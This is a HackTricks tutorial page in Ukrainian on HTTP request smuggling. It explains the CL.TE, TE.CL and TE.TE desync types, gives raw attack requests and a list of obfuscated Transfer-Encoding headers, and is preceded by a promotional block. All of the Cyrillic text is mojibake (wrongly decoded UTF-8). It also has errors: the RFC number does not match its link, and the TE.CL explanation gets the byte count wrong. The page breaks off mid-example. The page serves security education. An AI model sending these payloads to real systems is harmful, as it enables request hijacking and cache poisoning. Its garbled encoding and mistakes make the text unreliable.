# HTTP –ó–∞–ø–∏—Ç–æ–≤–µ –í–±–∏–≤—Å—Ç–≤–æ / –ê—Ç–∞–∫–∞ –Ω–∞ HTTP –î–µ—Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—é

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF** –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks swag**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFTs**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ —Ç–µ–ª–µ–≥—Ä–∞–º**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫—ñ–Ω–≥-—Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ GitHub.

</details>

## –©–æ —Ü–µ —Ç–∞–∫–µ

–¶—è –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –≤–∏–Ω–∏–∫–∞—î, –∫–æ–ª–∏ **–¥–µ—Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—è** –º—ñ–∂ **–ø—Ä–æ–∫—Å—ñ-—Å–µ—Ä–≤–µ—Ä–∞–º–∏ —Ñ—Ä–æ–Ω—Ç–µ–Ω–¥—É** —Ç–∞ **—Å–µ—Ä–≤–µ—Ä–æ–º –±–µ–∫–µ–Ω–¥—É** –¥–æ–∑–≤–æ–ª—è—î **–∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É** **–Ω–∞–¥—ñ—Å–ª–∞—Ç–∏** HTTP **–∑–∞–ø–∏—Ç**, —è–∫–∏–π –±—É–¥–µ **—ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–æ–≤–∞–Ω–∏–π** —è–∫ **–æ–¥–∏–Ω –∑–∞–ø–∏—Ç** –ø—Ä–æ–∫—Å—ñ-—Å–µ—Ä–≤–µ—Ä–∞–º–∏ **—Ñ—Ä–æ–Ω—Ç–µ–Ω–¥—É** (–±–∞–ª–∞–Ω—Å—É–≤–∞–Ω–Ω—è –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è / –∑–≤–æ—Ä–æ—Ç–Ω–∏–π –ø—Ä–æ–∫—Å—ñ) —Ç–∞ **—è–∫ 2 –∑–∞–ø–∏—Ç–∏** —Å–µ—Ä–≤–µ—Ä–æ–º **–±–µ–∫–µ–Ω–¥—É**.\
–¶–µ –¥–æ–∑–≤–æ–ª—è—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–≤—ñ **–∑–º—ñ–Ω–∏—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–π –∑–∞–ø–∏—Ç**, —è–∫–∏–π –Ω–∞–¥—Ö–æ–¥–∏—Ç—å –¥–æ —Å–µ—Ä–≤–µ—Ä–∞ **–±–µ–∫–µ–Ω–¥—É –ø—ñ—Å–ª—è –π–æ–≥–æ**.

### –¢–µ–æ—Ä—ñ—è

[**RFC –°–ø–µ—Ü–∏—Ñ—ñ–∫–∞—Ü—ñ—è (2161)**](https://tools.ietf.org/html/rfc2616)

> –Ø–∫—â–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –æ—Ç—Ä–∏–º–∞–Ω–æ –∑ –ø–æ–ª—è–º–∏ –∑–∞–≥–æ–ª–æ–≤–∫–∞ Transfer-Encoding —Ç–∞ Content-Length, –æ—Å—Ç–∞–Ω–Ω—î –ü–û–í–ò–ù–ù–û –±—É—Ç–∏ —ñ–≥–Ω–æ—Ä–æ–≤–∞–Ω–µ.

**Content-Length**

> –ó–∞–≥–æ–ª–æ–≤–æ–∫ —Å—É—Ç–Ω–æ—Å—Ç—ñ Content-Length –≤–∫–∞–∑—É—î —Ä–æ–∑–º—ñ—Ä —Ç—ñ–ª–∞ —Å—É—Ç–Ω–æ—Å—Ç—ñ, –≤ –±–∞–π—Ç–∞—Ö, –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–æ–≥–æ –æ—Ç—Ä–∏–º—É–≤–∞—á–µ–≤—ñ.

**Transfer-Encoding: chunked**

> –ó–∞–≥–æ–ª–æ–≤–æ–∫ Transfer-Encoding –≤–∫–∞–∑—É—î —Ñ–æ—Ä–º—É –∫–æ–¥—É–≤–∞–Ω–Ω—è, —è–∫–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –±–µ–∑–ø–µ—á–Ω–æ—ó –ø–µ—Ä–µ–¥–∞—á—ñ —Ç—ñ–ª–∞ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–≤—ñ.\
> Chunked –æ–∑–Ω–∞—á–∞—î, —â–æ –≤–µ–ª–∏–∫—ñ –¥–∞–Ω—ñ –≤—ñ–¥–ø—Ä–∞–≤–ª—è—é—Ç—å—Å—è —Å–µ—Ä—ñ—î—é —á–∞—Å—Ç–∏–Ω

### –†–µ–∞–ª—å–Ω—ñ—Å—Ç—å

**–§—Ä–æ–Ω—Ç–µ–Ω–¥** (–±–∞–ª–∞–Ω—Å—É–≤–∞–Ω–Ω—è –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è / –∑–≤–æ—Ä–æ—Ç–Ω–∏–π –ø—Ä–æ–∫—Å—ñ) **–æ–±—Ä–æ–±–ª—è—î** –∑–∞–≥–æ–ª–æ–≤–æ–∫ _**content-length**_ –∞–±–æ _**transfer-encoding**_, –∞ —Å–µ—Ä–≤–µ—Ä **–±–µ–∫–µ–Ω–¥—É –æ–±—Ä–æ–±–ª—è—î —ñ–Ω—à–∏–π**, —â–æ –≤–∏–∫–ª–∏–∫–∞—î **–¥–µ—Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—é** –º—ñ–∂ —Ü–∏–º–∏ 2 —Å–∏—Å—Ç–µ–º–∞–º–∏.\
–¶–µ –º–æ–∂–µ –±—É—Ç–∏ –¥—É–∂–µ –∫—Ä–∏—Ç–∏—á–Ω–∏–º, –æ—Å–∫—ñ–ª—å–∫–∏ **–∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑–º–æ–∂–µ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –æ–¥–∏–Ω –∑–∞–ø–∏—Ç** –¥–æ –∑–≤–æ—Ä–æ—Ç–Ω–æ–≥–æ –ø—Ä–æ–∫—Å—ñ, —è–∫–∏–π –±—É–¥–µ **—ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–æ–≤–∞–Ω–∏–π** —Å–µ—Ä–≤–µ—Ä–æ–º **–±–µ–∫–µ–Ω–¥—É —è–∫ 2 —Ä—ñ–∑–Ω—ñ –∑–∞–ø–∏—Ç–∏**. **–ù–µ–±–µ–∑–ø–µ–∫–∞** —Ü—ñ—î—ó —Ç–µ—Ö–Ω—ñ–∫–∏ –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ **—Å–µ—Ä–≤–µ—Ä –±–µ–∫–µ–Ω–¥—É —ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç—É–≤–∞—Ç–∏–º–µ** **–≤–Ω–µ–¥–µ–Ω–∏–π –¥—Ä—É–≥–∏–π –∑–∞–ø–∏—Ç** —Ç–∞–∫, –Ω—ñ–±–∏ –≤—ñ–Ω **–ø—Ä–∏–π—à–æ–≤ –≤—ñ–¥ –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ –∫–ª—ñ—î–Ω—Ç–∞**, –∞ **—Å–ø—Ä–∞–≤–∂–Ω—ñ–π –∑–∞–ø–∏—Ç** —Ü—å–æ–≥–æ –∫–ª—ñ—î–Ω—Ç–∞ –±—É–¥–µ **—á–∞—Å—Ç–∏–Ω–æ—é** **–≤–Ω–µ–¥–µ–Ω–æ–≥–æ –∑–∞–ø–∏—Ç—É**.

### –û—Å–æ–±–ª–∏–≤–æ—Å—Ç—ñ

–ü–∞–º'—è—Ç–∞–π—Ç–µ, —â–æ –≤ HTTP **—Å–∏–º–≤–æ–ª –Ω–æ–≤–æ–≥–æ —Ä—è–¥–∫–∞ —Å–∫–ª–∞–¥–∞—î—Ç—å—Å—è –∑ 2 –±–∞–π—Ç—ñ–≤:**

* **Content-Length**: –¶–µ–π –∑–∞–≥–æ–ª–æ–≤–æ–∫ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î **–¥–µ—Å—è—Ç–∫–æ–≤–µ —á–∏—Å–ª–æ**, —â–æ–± –≤–∫–∞–∑–∞—Ç–∏ **–∫—ñ–ª—å–∫—ñ—Å—Ç—å –±–∞–π—Ç—ñ–≤** —Ç—ñ–ª–∞ –∑–∞–ø–∏—Ç—É. –û—á—ñ–∫—É—î—Ç—å—Å—è, —â–æ —Ç—ñ–ª–æ –∑–∞–∫—ñ–Ω—á–∏—Ç—å—Å—è –æ—Å—Ç–∞–Ω–Ω—ñ–º —Å–∏–º–≤–æ–ª–æ–º, **–Ω–æ–≤–∏–π —Ä—è–¥–æ–∫ –Ω–µ –ø–æ—Ç—Ä—ñ–±–µ–Ω –≤ –∫—ñ–Ω—Ü—ñ –∑–∞–ø–∏—Ç—É**.
* **Transfer-Encoding:** –¶–µ–π –∑–∞–≥–æ–ª–æ–≤–æ–∫ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –≤ **—Ç—ñ–ª—ñ** **—à—ñ—Å—Ç–Ω–∞–¥—Ü—è—Ç–∫–æ–≤–µ —á–∏—Å–ª–æ**, —â–æ–± –≤–∫–∞–∑–∞—Ç–∏ **–∫—ñ–ª—å–∫—ñ—Å—Ç—å –±–∞–π—Ç—ñ–≤** **–Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ —á–∞–Ω–∫–∞**. **–ß–∞–Ω–∫** –ø–æ–≤–∏–Ω–µ–Ω **–∑–∞–∫—ñ–Ω—á—É–≤–∞—Ç–∏—Å—è** **–Ω–æ–≤–∏–º —Ä—è–¥–∫–æ–º**, –∞–ª–µ —Ü–µ–π –Ω–æ–≤–∏–π —Ä—è–¥–æ–∫ **–Ω–µ –≤—Ä–∞—Ö–æ–≤—É—î—Ç—å—Å—è** —ñ–Ω–¥–∏–∫–∞—Ç–æ—Ä–æ–º –¥–æ–≤–∂–∏–Ω–∏. –¶–µ–π –º–µ—Ç–æ–¥ –ø–µ—Ä–µ–¥–∞—á—ñ –ø–æ–≤–∏–Ω–µ–Ω –∑–∞–∫—ñ–Ω—á—É–≤–∞—Ç–∏—Å—è **—á–∞–Ω–∫–æ–º —Ä–æ–∑–º—ñ—Ä–æ–º 0, –∑–∞ —è–∫–∏–º —Å–ª—ñ–¥—É—é—Ç—å 2 –Ω–æ–≤–∏—Ö —Ä—è–¥–∫–∏**: `0`
* **Connection**: –ù–∞ –æ—Å–Ω–æ–≤—ñ –º–æ–≥–æ –¥–æ—Å–≤—ñ–¥—É —Ä–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **`Connection: keep-alive`** —É –ø–µ—Ä—à–æ–º—É –∑–∞–ø–∏—Ç—ñ –∑–∞–ø–∏—Ç—É –Ω–∞ –í–±–∏–≤—Å—Ç–≤–æ HTTP.

## –ë–∞–∑–æ–≤—ñ –ü—Ä–∏–∫–ª–∞–¥–∏

{% hint style="success" %}
–ü—Ä–∏ —Å–ø—Ä–æ–±—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ —Ü–µ –∑ Burp Suite **–≤–∏–º–∫–Ω—ñ—Ç—å `–û–Ω–æ–≤–ª–µ–Ω–Ω—è Content-Length` —Ç–∞ `–ù–æ—Ä–º–∞–ª—ñ–∑–∞—Ü—ñ—é HTTP/1 —Ä—è–¥–∫—ñ–≤`** –≤ –ø–æ–≤—Ç–æ—Ä—é–≤–∞—á—ñ, –æ—Å–∫—ñ–ª—å–∫–∏ –¥–µ—è–∫—ñ –≥–∞–¥–∂–µ—Ç–∏ –∑–ª–æ–≤–∂–∏–≤–∞—é—Ç—å –Ω–æ–≤–∏–º–∏ —Ä—è–¥–∫–∞–º–∏, –≤–æ–∑–≤—Ä–∞—Ç–∞–º–∏ –∫–∞—Ä–µ—Ç–∫–∏ —Ç–∞ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–∏–º–∏ –¥–æ–≤–∂–∏–Ω–∞–º–∏ –≤–º—ñ—Å—Ç—É.
{% endhint %}

–ê—Ç–∞–∫–∏ –≤–±–∏–≤—Å—Ç–≤–∞ HTTP-–∑–∞–ø–∏—Ç—ñ–≤ —Å—Ç–≤–æ—Ä—é—é—Ç—å—Å—è —à–ª—è—Ö–æ–º –Ω–∞–¥—Å–∏–ª–∞–Ω–Ω—è –Ω–µ–æ–¥–Ω–æ–∑–Ω–∞—á–Ω–∏—Ö –∑–∞–ø–∏—Ç—ñ–≤, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å —Ä–æ–∑–±—ñ–∂–Ω–æ—Å—Ç—ñ –≤ —Ç–æ–º—É, —è–∫ —Ñ—Ä–æ–Ω—Ç–µ–Ω–¥–æ–≤—ñ —Ç–∞ –±–µ–∫–µ–Ω–¥–æ–≤—ñ —Å–µ—Ä–≤–µ—Ä–∏ —ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç—É—é—Ç—å –∑–∞–≥–æ–ª–æ–≤–∫–∏ `Content-Length` (CL) —Ç–∞ `Transfer-Encoding` (TE). –¶—ñ –∞—Ç–∞–∫–∏ –º–æ–∂—É—Ç—å –ø—Ä–æ—è–≤–ª—è—Ç–∏—Å—è —É —Ä—ñ–∑–Ω–∏—Ö —Ñ–æ—Ä–º–∞—Ö, –ø–µ—Ä–µ–≤–∞–∂–Ω–æ —è–∫ **CL.TE**, **TE.CL** —Ç–∞ **TE.TE**. –ö–æ–∂–µ–Ω —Ç–∏–ø –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è—î —É–Ω—ñ–∫–∞–ª—å–Ω–µ –ø–æ—î–¥–Ω–∞–Ω–Ω—è —Ç–æ–≥–æ, —è–∫ —Ñ—Ä–æ–Ω—Ç–µ–Ω–¥–æ–≤—ñ —Ç–∞ –±–µ–∫–µ–Ω–¥–æ–≤—ñ —Å–µ—Ä–≤–µ—Ä–∏ –ø—Ä—ñ–æ—Ä–∏—Ç–∏–∑—É—é—Ç—å —Ü—ñ –∑–∞–≥–æ–ª–æ–≤–∫–∏. –í—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –≤–∏–Ω–∏–∫–∞—é—Ç—å –∑ –æ–±—Ä–æ–±–∫–∏ —Å–µ—Ä–≤–µ—Ä–∞–º–∏ –æ–¥–Ω–æ–≥–æ –π —Ç–æ–≥–æ –∂ –∑–∞–ø–∏—Ç—É —Ä—ñ–∑–Ω–∏–º–∏ —Å–ø–æ—Å–æ–±–∞–º–∏, —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –Ω–µ–æ—á—ñ–∫—É–≤–∞–Ω–∏—Ö —Ç–∞ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –∑–ª–æ–≤—ñ—Å–Ω–∏—Ö —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ñ–≤.

### –ë–∞–∑–æ–≤—ñ –ü—Ä–∏–∫–ª–∞–¥–∏ –¢–∏–ø—ñ–≤ –í—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

#### –í—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å CL.TE (Content-Length –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è —Ñ—Ä–æ–Ω—Ç–µ–Ω–¥–æ–º, Transfer-Encoding –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –±–µ–∫–µ–Ω–¥–æ–º)

* **–§—Ä–æ–Ω—Ç–µ–Ω–¥ (CL):** –û–±—Ä–æ–±–ª—è—î –∑–∞–ø–∏—Ç –Ω–∞ –æ—Å–Ω–æ–≤—ñ –∑–∞–≥–æ–ª–æ–≤–∫–∞ `Content-Length`.
* **–ë–µ–∫–µ–Ω–¥ (TE):** –û–±—Ä–æ–±–ª—è—î –∑–∞–ø–∏—Ç –Ω–∞ –æ—Å–Ω–æ–≤—ñ –∑–∞–≥–æ–ª–æ–≤–∫–∞ `Transfer-Encoding`.
* **–°—Ü–µ–Ω–∞—Ä—ñ–π –ê—Ç–∞–∫–∏:**
* –ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –Ω–∞–¥—Å–∏–ª–∞—î –∑–∞–ø–∏—Ç, –¥–µ –∑–Ω–∞—á–µ–Ω–Ω—è –∑–∞–≥–æ–ª–æ–≤–∫–∞ `Content-Length` –Ω–µ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î —Ñ–∞–∫—Ç–∏—á–Ω—ñ–π –¥–æ–≤–∂–∏–Ω—ñ –≤–º—ñ—Å—Ç—É.
* –§—Ä–æ–Ω—Ç–µ–Ω–¥–æ–≤–∏–π —Å–µ—Ä–≤–µ—Ä –ø–µ—Ä–µ—Å–∏–ª–∞—î –≤–µ—Å—å –∑–∞–ø–∏—Ç –Ω–∞ –±–µ–∫–µ–Ω–¥, –≤–∏—Ö–æ–¥—è—á–∏ –∑—ñ –∑–Ω–∞—á–µ–Ω–Ω—è `Content-Length`.
* –ë–µ–∫–µ–Ω–¥–æ–≤–∏–π —Å–µ—Ä–≤–µ—Ä –æ–±—Ä–æ–±–ª—è—î –∑–∞–ø–∏—Ç —è–∫ —á–∞–Ω–∫–æ–≤–∞–Ω–∏–π —á–µ—Ä–µ–∑ –∑–∞–≥–æ–ª–æ–≤–æ–∫ `Transfer-Encoding: chunked`, —ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç—É—é—á–∏ –∑–∞–ª–∏—à–∫–æ–≤—ñ –¥–∞–Ω—ñ —è–∫ –æ–∫—Ä–µ–º–∏–π, –Ω–∞—Å—Ç—É–ø–Ω–∏–π –∑–∞–ø–∏—Ç.
*   **–ü—Ä–∏–∫–ª–∞–¥:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### –í—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å TE.CL (Transfer-Encoding –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è —Ñ—Ä–æ–Ω—Ç–µ–Ω–¥–æ–º, Content-Length –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –±–µ–∫–µ–Ω–¥–æ–º)

* **–§—Ä–æ–Ω—Ç–µ–Ω–¥ (TE):** –û–±—Ä–æ–±–ª—è—î –∑–∞–ø–∏—Ç –Ω–∞ –æ—Å–Ω–æ–≤—ñ –∑–∞–≥–æ–ª–æ–≤–∫–∞ `Transfer-Encoding`.
* **–ë–µ–∫–µ–Ω–¥ (CL):** –û–±—Ä–æ–±–ª—è—î –∑–∞–ø–∏—Ç –Ω–∞ –æ—Å–Ω–æ–≤—ñ –∑–∞–≥–æ–ª–æ–≤–∫–∞ `Content-Length`.
* **–°—Ü–µ–Ω–∞—Ä—ñ–π –ê—Ç–∞–∫–∏:**
* –ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –Ω–∞–¥—Å–∏–ª–∞—î —á–∞–Ω–∫–æ–≤–∞–Ω–∏–π –∑–∞–ø–∏—Ç, –¥–µ —Ä–æ–∑–º—ñ—Ä —á–∞–Ω–∫–∞ (`7b`) —Ç–∞ —Ñ–∞–∫—Ç–∏—á–Ω–∞ –¥–æ–≤–∂–∏–Ω–∞ –≤–º—ñ—Å—Ç—É (`Content-Length: 4`) –Ω–µ –∑–±—ñ–≥–∞—é—Ç—å—Å—è.
* –§—Ä–æ–Ω—Ç–µ–Ω–¥–æ–≤–∏–π —Å–µ—Ä–≤–µ—Ä, –¥–æ—Ç—Ä–∏–º—É—é—á–∏—Å—å `Transfer-Encoding`, –ø–µ—Ä–µ—Å–∏–ª–∞—î –≤–µ—Å—å –∑–∞–ø–∏—Ç –Ω–∞ –±–µ–∫–µ–Ω–¥.
* –ë–µ–∫–µ–Ω–¥–æ–≤–∏–π —Å–µ—Ä–≤–µ—Ä, –¥–æ—Ç—Ä–∏–º—É—é—á–∏—Å—å `Content-Length`, –æ–±—Ä–æ–±–ª—è—î –ª–∏—à–µ –ø–æ—á–∞—Ç–∫–æ–≤—É —á–∞—Å—Ç–∏–Ω—É –∑–∞–ø–∏—Ç—É (`7b` –±–∞–π—Ç—ñ–≤), –∑–∞–ª–∏—à–∞—é—á–∏ —Ä–µ—à—Ç—É —è–∫ —á–∞—Å—Ç–∏–Ω—É –Ω–µ–Ω–∞–≤–º–∏—Å–Ω–æ–≥–æ –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ –∑–∞–ø–∏—Ç—É.
*   **–ü—Ä–∏–∫–ª–∞–¥:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```
#### –£—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å TE.TE (Transfer-Encoding –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –æ–±–æ–º–∞, –∑ –∑–∞—Ç–µ–º–Ω–µ–Ω–Ω—è–º)

* **–°–µ—Ä–≤–µ—Ä–∏:** –û–±–∏–¥–≤–∞ –ø—ñ–¥—Ç—Ä–∏–º—É—é—Ç—å `Transfer-Encoding`, –∞–ª–µ –æ–¥–∏–Ω –º–æ–∂–µ –±—É—Ç–∏ –æ–±–º–∞–Ω—É—Ç–∏–º —É —ñ–≥–Ω–æ—Ä—É–≤–∞–Ω–Ω—ñ –π–æ–≥–æ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∑–∞—Ç–µ–º–Ω–µ–Ω–Ω—è.
* **–°—Ü–µ–Ω–∞—Ä—ñ–π –∞—Ç–∞–∫–∏:**
* –ê—Ç–∞–∫—É—é—á–∏–π –Ω–∞–¥—Å–∏–ª–∞—î –∑–∞–ø–∏—Ç –∑ –∑–∞—Ç–µ–º–Ω–µ–Ω–∏–º–∏ –∑–∞–≥–æ–ª–æ–≤–∫–∞–º–∏ `Transfer-Encoding`.
* –ó–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ —Ç–æ–≥–æ, —è–∫–∏–π —Å–µ—Ä–≤–µ—Ä (—Ñ—Ä–æ–Ω—Ç–µ–Ω–¥ –∞–±–æ –±–µ–∫–µ–Ω–¥) –Ω–µ –≤–ø—ñ–∑–Ω–∞—î –∑–∞—Ç–µ–º–Ω–µ–Ω–Ω—è, –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∞ —É—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å CL.TE –∞–±–æ TE.CL.
* –ù–µ–≤—ñ–¥–ø—Ä–∞—Ü—å–æ–≤–∞–Ω–∞ —á–∞—Å—Ç–∏–Ω–∞ –∑–∞–ø–∏—Ç—É, —è–∫ –±–∞—á–∏—Ç—å –æ–¥–∏–Ω –∑ —Å–µ—Ä–≤–µ—Ä—ñ–≤, —Å—Ç–∞—î —á–∞—Å—Ç–∏–Ω–æ—é –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ –∑–∞–ø–∏—Ç—É, —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –∑–º–æ–≤–∏.
*   **–ü—Ä–∏–∫–ª–∞–¥:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **–°—Ü–µ–Ω–∞—Ä—ñ–π CL.CL (Content-Length –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è —è–∫ —Ñ—Ä–æ–Ω—Ç–µ–Ω–¥–æ–º, —Ç–∞–∫ —ñ –±–µ–∫–µ–Ω–¥–æ–º):**

* –û–±–∏–¥–≤–∞ —Å–µ—Ä–≤–µ—Ä–∏ –æ–±—Ä–æ–±–ª—è—é—Ç—å –∑–∞–ø–∏—Ç –ª–∏—à–µ –Ω–∞ –æ—Å–Ω–æ–≤—ñ –∑–∞–≥–æ–ª–æ–≤–∫–∞ `Content-Length`.
* –¶–µ–π —Å—Ü–µ–Ω–∞—Ä—ñ–π, —è–∫ –ø—Ä–∞–≤–∏–ª–æ, –Ω–µ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –∑–º–æ–≤–∏, –æ—Å–∫—ñ–ª—å–∫–∏ –æ–±–∏–¥–≤–∞ —Å–µ—Ä–≤–µ—Ä–∏ —ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç—É—é—Ç—å –¥–æ–≤–∂–∏–Ω—É –∑–∞–ø–∏—Ç—É –æ–¥–Ω–∞–∫–æ–≤–æ.
*   **–ü—Ä–∏–∫–ª–∞–¥:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

–ó–≤–∏—á–∞–π–Ω–∏–π –∑–∞–ø–∏—Ç
```

#### **–°—Ü–µ–Ω–∞—Ä—ñ–π CL != 0:**

* –í–∫–∞–∑—É—î –Ω–∞ —Å—Ü–µ–Ω–∞—Ä—ñ—ó, –¥–µ –∑–∞–≥–æ–ª–æ–≤–æ–∫ `Content-Length` –ø—Ä–∏—Å—É—Ç–Ω—ñ–π —ñ –º–∞—î –∑–Ω–∞—á–µ–Ω–Ω—è, –≤—ñ–¥–º—ñ–Ω–Ω–µ –≤—ñ–¥ –Ω—É–ª—è, —â–æ –≤–∫–∞–∑—É—î –Ω–∞ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å –≤–º—ñ—Å—Ç—É —Ç—ñ–ª–∞ –∑–∞–ø–∏—Ç—É.
* –¶–µ –≤–∞–∂–ª–∏–≤–æ –¥–ª—è —Ä–æ–∑—É–º—ñ–Ω–Ω—è —Ç–∞ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –∞—Ç–∞–∫ –∑–º–æ–≤–∏, –æ—Å–∫—ñ–ª—å–∫–∏ —Ü–µ –≤–ø–ª–∏–≤–∞—î –Ω–∞ —Ç–µ, —è–∫ —Å–µ—Ä–≤–µ—Ä–∏ –≤–∏–∑–Ω–∞—á–∞—é—Ç—å –∫—ñ–Ω–µ—Ü—å –∑–∞–ø–∏—Ç—É.
*   **–ü—Ä–∏–∫–ª–∞–¥:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

